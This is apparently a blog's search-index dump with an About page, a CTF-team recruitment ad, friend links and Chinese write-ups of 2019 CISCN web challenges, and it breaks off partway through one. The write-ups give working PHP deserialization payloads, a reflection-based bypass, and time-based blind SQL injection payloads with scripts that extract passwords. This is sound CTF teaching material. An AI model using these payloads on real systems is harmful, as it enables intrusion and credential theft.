{"pages":[{"title":"About","text":"Some useless but interesting CVE ID which I found. Name CVE ID Apache Tomcat CVE-2019-17569/CVE-2020-1935 Apache Traffic Server CVE-2020-1944 Ktor CVE-2020-26129/CVE-2021-25762 Hyper CVE-2021-21299 Microsoft IIS Server CVE-2020-0645 Mysqljs CVE-2019-14939(Actually Not) Netty CVE-2019-20444/CVE-2019-20445 Oracle Weblogic Server CVE-2020-2867/CVE-2020-14588/CVE-2020-14589 Puma CVE-2020-11076/CVE-2020-11077 Red Hat undertow CVE-2020-10719 Twisted CVE-2020-10108/CVE-2020-10109 Waitress CVE-2019-16789 Contact: Mail: echo emVkZHl1Lmx1QGdtYWlsLmNvbQ== | base64 --decode Follow me on twitter: Zeddy","link":"/about/index.html"},{"title":"Advertisements","text":"This is an advertisement page in Chinese. International CTF Team前言：文中无意冒犯国内战队，如有冒犯，请多多见谅。 一切的背景在近一两年国际 CTF （除 DEF CON 等非常重要比赛）上，越来越缺少国内队伍的身影，除了 0ops/NeSE 等队伍（而且这两支都是高校队伍不允许校外人士加入）比较活跃，基本上看不到其他国内队伍的存在，而且近两年冲击到一些国际赛前列的队伍更是寥寥无几。每当自己看着 Super Guesser （一支目前在 ctftime 上霸占 2021 总榜第一的队伍）在某某比赛取得很好的成绩，以及他们队伍内的氛围都令我感到非常羡慕。所以我也有个大胆的想法：想去竞争一下国际赛的前列。 虽然之前我也在推特上尝试找一支活跃的经常参加 ctftime 上比赛的队伍，但是种种原因没有找到合适的国际队伍，这也让我不禁陷入思考，为什么韩国、美国等都有这么些强力且活跃的队伍，为什么我们没有呢？ 我相信也存在一些 CTFer 跟我一样，喜欢 CTF 比赛但是苦于没有一支活跃的经常参加国际赛的队伍（这里的活跃大概指的是一月一次的频率甚至更多）。 所以在这里，我想聚集一群有共同想法的小伙伴一起冲击国际赛的前列！一起去薅资本主义的羊毛！一起去看看异国风景！ 怎么定义我们这群人呢？无意与国内队伍争蛋糕，我想我们更专注国际比赛。切勿将国内战队之间的风云带到这里。 区别于国内队伍，纯粹个人名义，不妨碍自己目前的队伍，随时都可以去原来自己队伍，但是如果遇到两个队伍都打的情况，需要保证自己每次只参加一个队比赛，禁止 py 。 可以说我们名义上不属于一个真正意义上的战队，我只想聚集一群有共同想法的小伙伴，我不想将国内队伍各种恩怨带入进来，请不要带着过多的战队门户偏见进入这里，在这里每个人只有一个身份，那就是 CTF 爱好者。所以如果有想法的小伙伴，请在处理好与当前战队关系的情况下再进行选择加入以免不必要的麻烦。 目前我们已经有几位来自各大战队的主力选手，并且还有一名国际友人！一起以 Water Paddler 小队的名义玩了几场国际赛，比如取得了 OMH P4 CTF 2021 9th 成绩，部分成员一起取得了 InCTF 2021 4th 成绩。 我们需要什么样的小伙伴呢？不管是否拥有国内战队队伍，前提必须妥善处理好与目前队伍的任何事务。 以纯个人名义加入，人品好 想打国际比赛，自己目前队伍又不打 想国外玩一玩的，恰恰资本主义烂钱的 有一定时间的。如果当月有觉得大家可以一起冲的比赛，至少当月能保证参加一次，这个频率大概是一个月一次，一次占一个周末两天左右 有一定实力的。参加过 5 次以上国际赛，至少半年以上国内赛经验。 最后就是认识大佬。我也想认识更多方向的小伙伴，交流知识，共同学习 如何选择比赛呢？我们专注于有一些比赛奖金的、有线下赛的国际比赛，或者比较好玩的都可以，比赛选择可以由大家共同商讨，但是我想我们需要活跃、自发、自愿的参与进来。 举个例子，比如 DEF CON CTF 等一些很重要比赛我们肯定没有能力去打的，毕竟我也有自己的队伍需要打，但是除了这些比赛之外，比如还有一些比赛我们是值得参加并冲击名次的，比如今年的 LINE CTF https://linectf.me/ 存在比较好的奖金，参加队伍也不多，我们也可以尝试去冲击。（我今年就有类似的想法，可是当时没有凑齐相同想法的小伙伴。 如何分配比赛的奖励呢？暂定想法：如果是纯奖金赛，奖金 100% 按贡献发放给各位；如果有线下赛名额，优先满足有贡献并且能出去的，其次是能出去的。 联系方式欢迎各种方向的小伙伴一起加入，私信我或者发送邮件到 emVkZHl1Lmx1QGdtYWlsLmNvbQ== 以下部分为知识星球内容部分： 知识星球我个人创建了一个知识星球，主要内容以 CTF 赛事中 Web 简要解题报告或者思路的知识星球，赛事主要以国际赛事为主。 关于我其实我也只是一个菜菜的 CTF 爱好者，没有固定战队，没有什么特别厉害之处，只是希望每场比赛之后能跟大家交流、学习、分享，目前大约有三年左右的国内赛经验，其中主要都是挨打经验；一年左右作为主要输出的国际赛经验。不喜欢国内的明争暗斗、尔虞我诈，尤喜国际赛 CTF 带给自己的新知识。 主要面向对象是谁呢？我的想法是主要面向喜欢CTF、热爱CTF的现役/退役Web选手或者一些安全研究员，因为内容主要以 CTF 为主，有些稀奇古怪或者根本没啥用的是经常可能发的，如果你是一线红队、渗透人员等，我觉得没有什么必要加入，当然如果你非常想进来学习也很欢迎。如果你想学一些稀奇古怪/异想天开的东西，通过一些CTF内容帮助你了解一些前沿的知识，那么这里我觉得是比较适合的。如果你想通过这个星球在国内赛事py则大可不必。 为什么做年收费星球呢？一方面我也喜欢白嫖，一方面我也知道其实国内真正喜欢CTF的Web选手屈指可数，喜欢分享喜欢交流的就更少了，所以为了筛选一部分伸手党以及一些三分钟热情的选手，以及整理内容自然需要我个人的时间精力。当然我也希望结交相同爱好的朋友，所以按照星球目前试运营阶段最大上限50人，只要你对我的想法感兴趣，也对CTF感兴趣，就可以私聊我，我会免费拉你进我星球，直到该阶段人数上限。 现在已经经过了试运营阶段，但是仍然欢迎有相同想法💡的合伙人一起运营这个星球，如果你会做以及分享一些 Java Web 的知识就更好啦。 为什么主要做国际赛呢？因为纯粹我觉得国际赛更有趣，我能从中学到更多的东西，没有什么其他的意思；并且我也快自己一个人参与了一年左右国际赛，深知赛后交流沟通总结的重要性，同时我也希望跟更多人交流沟通分享。还有就是国内赛太难了，一方面我比较菜做不来，一方面也没太多时间参与，一方面各大战队会发各自的 wp ，我再发没啥必要，当然也欢迎你在星球主动分享你觉得有意思的国内赛题目。 星球内容频率大概怎么样呢？我只会发我个人觉得值得发的东西，并不是所有国际赛都会去发。一般来说频率大概会是两三周一次，当然只要我有时间一周一次都有可能。在遇到我觉得比较好的比赛，我会花更多时间去研究其细节，所以花费的时间可能会更多。所以还是那句话，欢迎有类似想法的同学一起来做这件事。 白嫖加入为了结识优秀的 CTFer 以及共同学习的同学，以及过滤一些纯为了白嫖、抱着“能混一个就多混一个”星球想法的同学，并且现在也过渡了试运营阶段，我决定增加一些“白嫖”加入条件： 现役选手：连续一年以上国内赛经验（至少每个季度两场国内比赛） || 半年内以上国际赛经验（至少半年两场） 退役、半退役选手：两年比赛经验（允许间断），无论国内赛、国际赛 其余优质内容分享者，较强意愿持续更新博客内容者 关于经验要求：我也认识过很多表明自己很喜欢很热爱 CTF 的选手，但是在我认识他的范围内，他只在自己的语言形容词上表现了出来。 CTF 现在也不是什么紧缺资源，并不是想打比赛没有途径，倘若你真的热爱比赛， CTFtime 上的比赛现在几乎每周末都有比赛，无论比赛质量好坏，关键还是得看自己真正去尝试做了没有，希望你的热爱并不是停留在自己的形容词上。 你也可以使用以下免费体验卡看看星球内容： 由于知识星球的免费体验卡存在有效期，所以如果有同学希望免费体验的话或者符合白嫖条件的可以发邮件给我！ 希望在这里结识更多热爱 CTF 的同学！也希望你能在这里学习到新东西，成长为更优秀的 CTFer ！ 最后，我也不打算大范围宣传，只能说佛系运营，如果你觉得我这个想法不错，不嫌弃我比较菜，也欢迎你推荐喜欢CTF/热爱CTF的Web选手加入进来。 知识星球二维码如下： 如二维码无法加载：我正在「Funny Web CTF」和朋友们讨论有趣的话题，你⼀起来吧？https://t.zsxq.com/7y7iAuf","link":"/advertisement/index.html"},{"title":"大师傅们","text":"group: 开发大佬icon: fas fa-user-tieitems: name: Rexurl: https://www.rexskz.info/tags: # 标签 全能大佬 曾老师 name: AddOneGurl: http://www.addoneg.com/tags: # 标签 前端大佬 name: Ninjiacoderurl: http://rayzhao98.top/tags: # 标签 全干开发 name: 板url: https://yuwenjie.cc/tags: # 标签 板！ name: A2OSurl: https://safeu.a2os.club/tags: # 标签 Nuaa Open Source group: 安全大佬icon: fas fa-user-tieitems: name: Asuri-Teamurl: https://www.asuri.orgtags: # 标签 My Team name: 白师傅url: https://www.summershrimp.com/tags: # 标签 全能大佬 金牌运维 name: hac425url: https://www.cnblogs.com/hac425/tags: # 标签 Pwn牛 name: w0lfzhangurl: https://www.w0lfzhang.com/tags: # 标签 Pwn日天 name: 耗几锅锅url: http://showlinkroom.me/tags: # 标签 name: DoubleMiceurl: https://doublemice.github.io/tags: # 标签 name: 40m41h42turl: https://qrzbing.cn/tags: # 标签 name: Imagemlturl: http://hexo.imagemlt.xyz/tags: # 标签 Webdalao name: P牛url: https://www.leavesongs.com/tags: # 标签 name: 梅子酒url: https://meizjm3i.github.io/tags: # 标签 name: 郁离歌url: http://yulige.top/tags: # 标签 name: Miourl: https://inory009.github.io/tags: # 标签 name: 默小西url: http://momomoxiaoxi.comtags: # 标签 name: CHYbetaurl: https://chybeta.github.iotags: # 标签 name: LoRexxarurl: http://lorexxar.cntags: # 标签 name: K0rz3nurl: http://www.k0rz3n.comtags: # 标签 name: Venenof7url: http://www.venenof.com/tags: # 标签 name: Saulty4ishurl: http://www.saulty4ish.cntags: # 标签 name: 4uuu Nyaurl: https://qvq.im/tags: # 标签 name: 一叶飘零url: http://skysec.top/tags: # 标签 name: Tom4t0url: https://bl4ck.in/tags: # 标签 name: Virinkurl: https://www.virzz.com/tags: # 标签 name: p0destaurl: http://p0desta.com/tags: # 标签 Name: EvilWing Url: https://evilwing.me/ Name: zsx Url: https://blog.zsxsoft.com Name: Decade Url: https://wulidecade.cn/ Name: RRR Url: http://120.79.211.91/","link":"/friends/index.1.html"},{"title":"大师傅们","text":"无序，大部分为单方向友链，方便自己膜拜大师傅们的博客。 Group Name Link Develop Rex https://www.rexskz.info/ AddOneG http://www.addoneg.com/ Ninjiacoder http://rayzhao98.top/ 板 https://yuwenjie.cc/ Team A2OS https://a2os.club/ Asuri https://www.asuri.org Security 白师傅 https://www.summershrimp.com/ hac425 https://www.cnblogs.com/hac425/ w0lfzhang https://www.w0lfzhang.com/ 耗几锅锅 http://showlinkroom.me/ DoubleMice https://doublemice.github.io/ 40m41h42t https://qrzbing.cn/ Imagemlt http://hexo.imagemlt.xyz/ P牛 https://www.leavesongs.com/ 梅子酒 https://meizjm3i.github.io/ 郁离歌 http://yulige.top/ Mio https://inory009.github.io/ 默小西 http://momomoxiaoxi.com CHYbeta https://chybeta.github.io LoRexxar http://lorexxar.cn K0rz3n http://www.k0rz3n.com Venenof7 http://www.venenof.com/ 4uuu Nya https://qvq.im/ 一叶飘零 http://skysec.top/ Tom4t0 https://bl4ck.in/ Virink https://www.virzz.com/ p0desta http://p0desta.com/ EvilWing https://evilwing.me/ zsx https://blog.zsxsoft.com Decade https://wulidecade.cn/ RRR http://120.79.211.91/ Rmb122 https://rmb122.com/ RR https://ricterz.me/ Smi1e https://www.smi1e.top/ evoA https://evoa.me/ p0 https://p0sec.net/ Hpdoger https://hpdoger.cn/ wonderkun https://wonderkun.cc/ MiaoTony https://miaotony.xyz Y1ng https://gem-love.com/ gml https://igml.top/ LFY https://lfysec.top/","link":"/friends/index.html"}],"posts":[{"title":"2019 CISCN RefSpace","text":"国赛中 RefSpace 那道题的 wp 与研究。 国赛 day2 出现了一道比较有意思的题，最后貌似只有5人能解出。赛时我尝试通过覆写函数来实现直接 getFlag ，最后发现自己还是太年轻了，预期解应该就是通过 php 反射类来覆写 namespace 中的sha1()函数来达到 getFlag。 所以整个题解题思路大致是： 通过 phar/zip 协议，绕过上传点拿到 webshell 通过 php 反射类覆写 sha1 函数 getFlag 让我们首先来了解一下 php 反射 ReflectionPHP 5 具有完整的反射 API，添加了对类、接口、函数、方法和扩展进行反向工程的能力。 此外，反射 API 提供了方法来取出函数、类和方法中的文档注释。 请注意部分内部 API 丢失了反射扩展工作所需的代码。 例如，一个内置的 PHP 类可能丢失了反射属性的数据。这些少数的情况被认为是错误，不过， 正因为如此，它们应该被发现和修复。 反射，直观理解就是根据到达地找到出发地和来源。比如，一个光秃秃的对象，我们可以仅仅通过这个对象就能知道它所属的类、拥有哪些方法。 GET在Reflection Class中我们可以看到很多比较有趣的 api ，例如 getProperties 官方文档也给出了例子： 12345678910111213141516171819&lt;?phpclass Foo { public $foo = 1; protected $bar = 2; private $baz = 3;}$foo = new Foo();$reflect = new ReflectionClass($foo);$props = $reflect-&gt;getProperties(ReflectionProperty::IS_PUBLIC | ReflectionProperty::IS_PROTECTED);foreach ($props as $prop) { print $prop-&gt;getName() . \"\\n\";}var_dump($props);?&gt; OutPut: 123456789101112131415161718foobararray(2) { [0]=&gt; object(ReflectionProperty)#3 (2) { [\"name\"]=&gt; string(3) \"foo\" [\"class\"]=&gt; string(3) \"Foo\" } [1]=&gt; object(ReflectionProperty)#4 (2) { [\"name\"]=&gt; string(3) \"bar\" [\"class\"]=&gt; string(3) \"Foo\" }} 读取私有成员变量如果想要输出私有变量，就加上ReflectionProperty::IS_PRIVATE即可。 执行私有函数既然可以拿到类成员的值，那么函数返回值能不能拿到呢？ 当然是可以的 123456789class Foo { private function showFlag(){ return 'This is not flag'; }}$reflectionMethod = new ReflectionMethod('Foo', 'showFlag');$reflectionMethod-&gt;setAccessible(true);echo $reflectionMethod-&gt;invoke(new Foo()); OutPut: 1This is not flag SET修改类的成员变量利用ReflectionProperty::setValue可以修改成员变量，可以参考官方文档给出示例，这里也给一个例子，修改 private 或者 protected 类型的变量也要加上setAccessible(true)，否则会报错 1234567891011121314151617181920212223242526class Foo { public $foo = 1; protected $bar = 2; private $baz = 3;}$foo = new Foo();$reflect = new ReflectionClass($foo);//change foo fron 1 to 5$reflect-&gt;getProperty('foo')-&gt;setValue($foo, '5');//change baz from 3 to 4$baz = $reflect-&gt;getProperty('baz');$baz-&gt;setAccessible(true);$baz-&gt;setValue($foo, '4');//Output$props = $reflect-&gt;getProperties(ReflectionProperty::IS_PUBLIC | ReflectionProperty::IS_PROTECTED | ReflectionProperty::IS_PRIVATE);foreach ($props as $prop) { $prop-&gt;setAccessible(true); print $prop-&gt;getName() . \"\\n\"; print $prop-&gt;getValue($foo).\"\\n\";} Output: 1foo 5 bar 2 baz 4 修改函数返回值并不能直接修改函数返回值 Namespace这里简单提一下 php 中的 namespace 命名空间，简单来说 php 命名空间为了解决的就是覆写 php 内部函数的问题，详细可以参考命名空间概述。 举个例子： 123456namespace Foo;function sha1($key){ return \"This is Foo sha1\";}var_dump(sha1('1'));var_dump(\\sha1('1')); Output: 123/test.php:6:string 'This is Foo sha1' (length=18)/test.php:7:string '356a192b7913b04c54574d18c28d46e6395428ab' (length=40) RefSpace接着我们来看看这个题，首先通过一系列操作 getshell ，参考zip或phar协议包含文件，这里就略过了，都是重复性简单的操作，得到以下源码 app/index 12345678910111213141516171819202122&lt;?phpif (!defined('LFI')) { echo \"Include me!\"; exit();}?&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt;&lt;/head&gt;&lt;body&gt; Hi CTFer,&lt;br /&gt; 这是一个非常非常简单的SDK服务，它的任务是给各位大佬&lt;!--鼠--&gt;提供flag&lt;br /&gt; Powered by Aoisystem&lt;br /&gt; &lt;!-- error_reporting(E_ALL); --&gt; &lt;/body&gt;&lt;/html&gt; app/Up10aD 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpif (!defined('LFI')) { echo \"Include me!\"; exit();}if (isset($_FILES[\"file\"])) { $filename = $_FILES[\"file\"][\"name\"]; $fileext = \".gif\"; switch ($_FILES[\"file\"][\"type\"]) { case 'image/gif': $fileext = \".gif\"; break; case 'image/jpeg': $fileext = \".jpg\"; break; default: echo \"Only gif/jpg allowed\"; exit(); } $dst = \"upload/\" . $_FILES[\"file\"][\"name\"] . $fileext; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $dst); echo \"文件保存位置: {$dst}&lt;br /&gt;\";}?&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt;&lt;/head&gt;&lt;body&gt; 我们不能让选手轻而易举的搜索到上传接口。&lt;br /&gt; 即便是运气好的人碰巧遇到了，我相信我们的过滤是万无一失的(才怪 &lt;form method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;label for=\"file\"&gt;来选择你的文件吧:&lt;/label&gt; &lt;input type=\"file\" name=\"file\" id=\"file\" /&gt; &lt;br /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"Submit\" /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; index.php 123456789101112&lt;?phperror_reporting(E_ALL);define('LFI', 'LFI');$lfi = $_GET['route'] ?? false;if (!$lfi) { header(\"location: ?route=app/index\"); exit();}include \"{$lfi}.php\";//Good job, you know how to use LFI, don't you?//But You are still far from flag//hint: ?router=app/flag app/flag 12345678910111213141516171819202122&lt;?phpif (!defined('LFI')) { echo \"Include me!\"; exit();}use interesting\\FlagSDK;$sdk = new FlagSDK();$key = $_GET['key'] ?? false;if (!$key) { echo \"Please provide access key&lt;br \\&gt;\"; echo '$_GET[\"key\"];'; exit();}$flag = $sdk-&gt;verify($key);if ($flag) { echo $flag;} else { echo \"Wrong Key\"; exit();}//Do you want to know more about this SDK?//we 'accidentally' save a backup.zip for more information sdk 开发文档.txt: 1234567891011121314151617我们的SDK通过如下SHA1算法验证key是否正确:public function verify($key){ if (sha1($key) === $this-&gt;getHash()) { return \"too{young-too-simple}\"; } return false;}如果正确的话，我们的SDK会返回flag。PS: 为了节省各位大佬的时间，特注明true1.此处函数return值并不是真正的flag，和真正的flag没有关系。true2.此处调用的sha1函数为PHP语言内建的hash函数。(http://php.net/manual/zh/function.sha1.php)true3.您无须尝试本地解码或本地运行sdk.php，它被预期在指定服务器环境上运行。true4.几乎大部分源码内都有一定的hint，如果您是通过扫描目录发现本文件的，您可能还有很长的路要走。 所以这里重点就是 flag.php 了，之前我们提到过可以在命名空间覆写函数，可是即使可以覆写，那要怎么绕过verify这个函数呢？ Invoke我们可以发现在verify函数中，getHash()函数并没有传参，很有可能就是直接返回了一个固定值或者随机值什么的，那我们是不是可以利用反射类来执行getHash()函数，覆写sha1()函数绕过verify判断呢？ 于是我们可以操作一波 1234567891011121314151617181920212223242526272829303132&lt;?phpnamespace interesting;class FlagSDK{ private function getHash(){ return \\sha1('test'); } public function verify($key) { if (sha1($key) === $this-&gt;getHash()) { return \"flag{xxx}\"; } return false; }}$sdk = new FlagSDK();function sha1($key){ $reflectionMethod = new \\ReflectionMethod('interesting\\FlagSDK', 'getHash'); $reflectionMethod-&gt;setAccessible(true); return $reflectionMethod-&gt;invoke(new FlagSDK());}$flag = $sdk-&gt;verify('1');if ($flag) { echo $flag;} else { echo \"Wrong Key\"; exit();} 基本构造如上，由于环境已经关了，只能本地实现以下，思路就是以上说的通过反射类来覆写 namespace 的sha1函数来达到绕过效果 做题的时候 flag.php 是有写权限的，所以我们只要把sha1代码写入 flag.php 就可以了 12345function sha1($key){ $reflectionMethod = new \\ReflectionMethod('interesting\\FlagSDK', 'getHash'); $reflectionMethod-&gt;setAccessible(true); return $reflectionMethod-&gt;invoke(new FlagSDK());} 当然，也可以像 @zsx 师傅一样手撕加密 orz … Referencectf中的php反射 ROIS CISCN 全国大学生信息安全竞赛线上赛 Writeup 第12届全国大学生信息安全竞赛Web题解","link":"/2019/05/09/2019ciscn-RefSpace/"},{"title":"2019 CISCN Web wp","text":"国赛 Web wp Day 1WebJustSosoIndex.php 1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET[\"file\"]; $payload = $_GET[\"payload\"];if(!isset($file)){trueecho 'Missing parameter'.'&lt;br&gt;';}if(preg_match(\"/flag/\",$file)){truedie('hack attacked!!!');}@include($file);if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(\"/flag/\",$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload);}else{ echo \"Missing parameters\"; } ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt; Hint.php 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php class Handle{ private $handle; public function __wakeup(){truetrueforeach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo \"Waking up\\n\"; }truepublic function __construct($handle) { $this-&gt;handle = $handle; } truepublic function __destruct(){truetrue$this-&gt;handle-&gt;getFlag();true}}class Flag{ public $file; public $token; public $token_flag; function __construct($file){truetrue$this-&gt;file = $file;truetrue$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); } truepublic function getFlag(){truetrue$this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag)truetrue{truetruetrueif(isset($this-&gt;file)){truetruetruetrueecho @highlight_file($this-&gt;file,true); } } }}?&gt; 从SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析了解到可以把以下 payload 1O:6:\"Handle\":1: 中的 1 改成比 1 大的数可以在反序列化时绕过_warkeup魔术方法绕过$this-&gt;token === $this-&gt;token_flag的判断可以直接通过爆破来绕过 贴一下脚本： 12345678910111213141516171819202122import requestsimport timeurl =\"http://e281a336df8b4ea1b7665704aca7b30246d3cd0663434603.changame.ichunqiu.com///?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A3%3A{s%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A{s%3A4%3A%22file%22%3Bs%3A10%3A%22.%2Fflag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff%22%3Bs%3A10%3A%22token_flag%22%3Bs%3A32%3A%227b670d553471ad0fd7491c75bad587ff%22%3B}}\"proxies ={ 'http':'http://127.0.0.1:8080/'}for i in range(1,1000000): rep = requests.get(url) if rep.status_code == 200: if 'flag' in rep.text: print(rep.text) else: print(rep.status_code) i = i + 1 time.sleep(1)# rep = requests.get(url)# print(rep.status_code) 这里预期解应该是引用，利用$this-&gt;token_flag = &amp;$this-&gt;token，这样来绕过 全宇宙最简单的SQL页面会返回两种错误，一种是登录失败，一种是数据库查询失败 所以我们可以通过利用admin'等操作来 fuzz 闭合方式，得到可以使用单引号闭合。但是通过万能密码可以发现一些关键字被替换了 通过一些简单的 fuzz 可以发现有以下关键字被过滤了 1or || if field elt 布尔盲注没有可以区分的页面回显，所以这里不能用布尔盲注，报错注入也不行。所以基本确定只能用时间盲注。 结果发现sleep()、benchmark()等函数均被过滤了，只能寻找一些新的延时注入的方法，在mysql盲注备忘录中发现新的注入方式 1234567MariaDB [(none)]&gt; select rpad('a',2000000,'a') RLIKE concat(repeat('(a.*)+',30),'b');+-------------------------------------------------------------+| rpad('a',2000000,'a') RLIKE concat(repeat('(a.*)+',30),'b') |+-------------------------------------------------------------+| 0 |+-------------------------------------------------------------+1 row in set, 1 warning (0.149 sec) 虽然本地没很明显延时，但是打服务器发生了明显的延时。所以接下来就是利用这个点进行时间盲注了。而if又被过滤了，我们就只能通过以下方式去触发延时 1admin' and (SELECT length(database()) limit 0,1) = 3 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# 数据库长度为3 12345admin' and substr((SELECT database() limit 0,1),1,1) = 'c' and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#admin' and substr((SELECT database() limit 0,1),2,1) = 't' and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#admin' and substr((SELECT database() limit 0,1),3,1) = 'f' and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# 数据库名字为 ctf 但是如果要接下去拿表名的话传统方法只能去利用information_schema，但是or又被过滤了，而information_schema中又含有or，所以肯定不能行。 过滤了information_schema基本上没什么替代方式了。所以我们这里只能另辟蹊径。 之前了解过可以通过不用列名的方式注入，所以这里觉得应该可以直接读password或者什么，管他这个列名叫啥，读就对了。注意这里用offset 1 limit 1读第二个才是真正的密码，这里时间不太够，临时用手验证了前几位。爆了 4 位得到F1AG，以为就是密码了…结果错了…最后还是手动加脚本跑出来了 1234567891011121314admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),2,1)) = 49 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),3,1)) = 65 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),4,1)) = 71 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),5,1)) = 64 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),6,1)) = 49 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),7,1)) = 115 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),7,1)) = 115 and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');# 注意这里最好不要用substr()='x'这样判断，大小写很有问题，而且当时网络环境极其不好…跑了好几遍都有不同的答案…最后在赛后用ascii跑出了密码，附脚本 123456789101112131415161718192021222324252627282930313233343536# encoding: utf-8import requestsimport reindex_url = \"http://39.97.227.64:52105/\"header = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36',}flag = ''table = ''column = ''proxies={ 'http':'http://127.0.0.1:8080/'}for i in range(1,32): print(i) for j in range(33,126): # j = ord(j) # payload = \"0\\\") or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='challenges'),\"+ str(i) +\",1))=\"+ str(j) +\"),sleep(5),0);%23\" string1 = \"admin' and ascii(substr((select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1 offset 1),\"+ str(i) + \",1)) = '\"+ str(j) + \"' and rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');#\" payload ={ 'username': string1, 'password': '11' } url = index_url try: r = requests.post(url=url, data=payload,headers=header,timeout=3.5,proxies=proxies) except: flag += chr(j) print(flag) break 得到密码： 1F1AG@1s-at_/fll1llag_h3r3 进去看到 admin 页面，也很明显，也就是 Rogue mysql 那一套了。 DDCTF 2019 /HGAME 2019我都有写相关的 wp ，这里就不再重复了。老一套的操作，不过这里他是不能指定端口，固定访问你的 3306 ，所以你需要把自己的 vps 的 3306 端口开启才行。按照密码提示直接读就是了 顺便拿了一波题目源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;meta name=\"description\" content=\"\"&gt; &lt;meta name=\"author\" content=\"\"&gt; &lt;title&gt;全宇宙最简单的SQL&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link href=\"bootstrap.min.css\" rel=\"stylesheet\"&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=\"grid.css\" rel=\"stylesheet\"&gt;&lt;/head&gt;&lt;body style=\"background-color: lightgrey\"&gt;&lt;div class=\"container\"&gt; &lt;h1&gt;全宇宙最简单的SQL&lt;/h1&gt; &lt;p class=\"lead\"&gt;没有比这题更简单的SQL了，我把秘密藏在数据库里面了！&lt;/p&gt; &lt;hr&gt; &lt;?php error_reporting(0); session_start(); if (!$_SESSION['admin']) { if (!$_SERVER['HTTP_ACCEPT']) { echo \"&lt;p style='color: red'&gt;你莫非是机器人？&lt;/p&gt;\"; }else if (!empty($_POST['password']) &amp;&amp; !empty($_POST['username'])) { $conn = new mysqli(); $conn -&gt; connect(\"localhost\", \"ctf123\", \"ctf123\", 'ctf', 3306); if ($conn -&gt; connect_errno) { echo \"&lt;p style='color: red'&gt;数据库连接失败: \" . $conn -&gt; connect_error . \"&lt;/p&gt;\"; } else { $_POST['username'] = preg_replace(\"/join|get_lock|benchmark|sleep|make_set|field|elt|if|case|or|\\|/i\", \"QwQ\", $_POST['username']); echo \"&lt;p style='color: green'&gt;登录用户名：\" . $_POST['username'] . \"&lt;/p&gt;\"; $conn -&gt; set_charset(\"utf8\"); $sql = \"select password from user where username='\" . $_POST['username'] . \"'\"; $result = $conn -&gt; query($sql); if ($conn -&gt; errno) { echo \"&lt;p style='color: red'&gt;数据库操作失败！&lt;/p&gt;\"; }else { if (!$result) { echo \"&lt;p style='color: red'&gt;登陆失败！&lt;/p&gt;\"; }else { $row = $result -&gt; fetch_assoc(); if ($row['password'] === $_POST['password'] &amp;&amp; $_POST['username'] === 'admin') { $_SESSION['admin'] = 1; }else { echo \"&lt;p style='color: red'&gt;登陆失败！&lt;/p&gt;\"; } } } $conn -&gt; close(); } }else { echo \"&lt;p style='color: red'&gt;你不是管理员！&lt;/p&gt;\"; } } if ($_SESSION['admin']) { echo \"&lt;p style='color: green'&gt;你好！管理员！&lt;/p&gt;\"; if (!empty($_POST['host']) 